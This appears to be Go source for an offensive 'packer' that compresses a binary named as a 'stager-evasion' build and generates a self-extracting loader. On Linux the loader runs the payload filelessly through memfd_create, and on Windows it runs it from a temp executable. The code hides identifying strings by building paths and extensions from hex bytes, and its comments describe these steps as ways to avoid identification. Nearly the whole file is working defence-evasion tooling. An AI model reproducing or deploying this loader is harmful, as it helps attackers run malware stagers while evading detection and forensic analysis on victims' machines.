// packer — Custom compression packer that creates self-extracting loader binaries.
//
// Reads a compiled binary, compresses with gzip, generates a Go loader source
// that embeds the compressed data and extracts+executes at runtime.
//
// Linux: fileless execution via memfd_create syscall.
// Windows: temp file execution with cleanup.
//
// Usage:
//
//	packer -input build/stager-evasion-linux-amd64 -output build/stager-packed-linux-amd64 -goos linux -goarch amd64
package main

import (
	"bytes"
	"compress/gzip"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	inputFile := flag.String("input", "", "Input binary to pack")
	outputFile := flag.String("output", "", "Output packed binary")
	targetOS := flag.String("goos", "linux", "Target GOOS (linux or windows)")
	targetArch := flag.String("goarch", "amd64", "Target GOARCH")
	flag.Parse()

	if *inputFile == "" || *outputFile == "" {
		log.Fatal("usage: packer -input <binary> -output <packed-binary> -goos <os> -goarch <arch>")
	}

	// Read input binary.
	data, err := os.ReadFile(*inputFile)
	if err != nil {
		log.Fatalf("read %s: %v", *inputFile, err)
	}

	// Compress with gzip.
	var compressed bytes.Buffer
	gz, err := gzip.NewWriterLevel(&compressed, gzip.BestCompression)
	if err != nil {
		log.Fatalf("gzip writer: %v", err)
	}
	if _, err := gz.Write(data); err != nil {
		log.Fatalf("gzip write: %v", err)
	}
	if err := gz.Close(); err != nil {
		log.Fatalf("gzip close: %v", err)
	}

	fmt.Printf("packer: %s %d bytes -> %d bytes compressed (%.1f%%)\n",
		*inputFile, len(data), compressed.Len(),
		float64(compressed.Len())/float64(len(data))*100)

	// Generate loader source.
	loaderSrc := generateLoader(compressed.Bytes(), *targetOS)

	// Create temp directory for building loader.
	tmpDir, err := os.MkdirTemp("", "packer-*")
	if err != nil {
		log.Fatalf("mkdtemp: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	// Write loader source.
	loaderFile := filepath.Join(tmpDir, "main.go")
	if err := os.WriteFile(loaderFile, []byte(loaderSrc), 0644); err != nil {
		log.Fatalf("write loader: %v", err)
	}

	// Write go.mod for the loader.
	goMod := "module loader\n\ngo 1.24\n"
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		log.Fatalf("write go.mod: %v", err)
	}

	// Build loader binary.
	absOutput, err := filepath.Abs(*outputFile)
	if err != nil {
		log.Fatalf("abs path: %v", err)
	}

	// Ensure output directory exists.
	if err := os.MkdirAll(filepath.Dir(absOutput), 0755); err != nil {
		log.Fatalf("mkdir: %v", err)
	}

	cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", absOutput, ".")
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(),
		"CGO_ENABLED=0",
		"GOOS="+*targetOS,
		"GOARCH="+*targetArch,
	)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		log.Fatalf("build loader: %v", err)
	}

	// Report sizes.
	outInfo, err := os.Stat(absOutput)
	if err != nil {
		log.Fatalf("stat output: %v", err)
	}
	fmt.Printf("packer: %s -> %s (%d bytes)\n", *inputFile, *outputFile, outInfo.Size())
}

func generateLoader(compressedData []byte, targetOS string) string {
	var b bytes.Buffer

	b.WriteString("package main\n\n")

	if targetOS == "linux" {
		b.WriteString(generateLinuxLoader(compressedData))
	} else {
		b.WriteString(generateWindowsLoader(compressedData))
	}

	return b.String()
}

func generateLinuxLoader(data []byte) string {
	var b bytes.Buffer

	b.WriteString(`import (
	"bytes"
	"compress/gzip"
	"io"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

func main() {
	d := decompress(payload)

	// memfd_create syscall (319 on amd64) — fileless execution.
	// Name is empty to avoid identification.
	name, _ := syscall.BytePtrFromString("")
	fd, _, errno := syscall.Syscall(319, uintptr(unsafe.Pointer(name)), 0, 0)
	if errno != 0 {
		os.Exit(1)
	}

	// Write decompressed binary to memfd.
	_, err := syscall.Write(int(fd), d)
	if err != nil {
		syscall.Close(int(fd))
		os.Exit(1)
	}

	// Build path: /proc/self/fd/<N>
	// Constructed without identifiable string literals.
	p := []byte{0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x66, 0x64, 0x2f}
	fdPath := string(p) + strconv.Itoa(int(fd))

	// Forward all arguments. syscall.Exec replaces this process.
	argv := append([]string{fdPath}, os.Args[1:]...)
	if err := syscall.Exec(fdPath, argv, os.Environ()); err != nil {
		os.Exit(1)
	}
}

func decompress(data []byte) []byte {
	r, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		os.Exit(1)
	}
	defer r.Close()
	out, err := io.ReadAll(r)
	if err != nil {
		os.Exit(1)
	}
	return out
}

`)

	// Embed compressed data as byte slice.
	b.WriteString("var payload = []byte{")
	for i, byt := range data {
		if i > 0 {
			b.WriteString(", ")
		}
		if i%20 == 0 {
			b.WriteString("\n\t")
		}
		fmt.Fprintf(&b, "0x%02x", byt)
	}
	b.WriteString(",\n}\n")

	return b.String()
}

func generateWindowsLoader(data []byte) string {
	var b bytes.Buffer

	b.WriteString(`import (
	"bytes"
	"compress/gzip"
	"io"
	"os"
	"os/exec"
)

func main() {
	d := decompress(payload)

	// Write to temp file. Build extension from bytes to avoid string literals.
	ext := string([]byte{0x2e, 0x65, 0x78, 0x65}) // .exe
	tmp, err := os.CreateTemp("", string([]byte{0x70, 0x6b}) + "*" + ext)
	if err != nil {
		os.Exit(1)
	}
	tmpPath := tmp.Name()

	if _, err := tmp.Write(d); err != nil {
		tmp.Close()
		os.Remove(tmpPath)
		os.Exit(1)
	}
	tmp.Close()

	// Execute the extracted binary, forwarding all arguments.
	cmd := exec.Command(tmpPath, os.Args[1:]...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()

	// Cleanup.
	os.Remove(tmpPath)

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			os.Exit(exitErr.ExitCode())
		}
		os.Exit(1)
	}
}

func decompress(data []byte) []byte {
	r, err := gzip.NewReader(bytes.NewReader(data))
	if err != nil {
		os.Exit(1)
	}
	defer r.Close()
	out, err := io.ReadAll(r)
	if err != nil {
		os.Exit(1)
	}
	return out
}

`)

	// Embed compressed data as byte slice.
	b.WriteString("var payload = []byte{")
	for i, byt := range data {
		if i > 0 {
			b.WriteString(", ")
		}
		if i%20 == 0 {
			b.WriteString("\n\t")
		}
		fmt.Fprintf(&b, "0x%02x", byt)
	}
	b.WriteString(",\n}\n")

	return b.String()
}
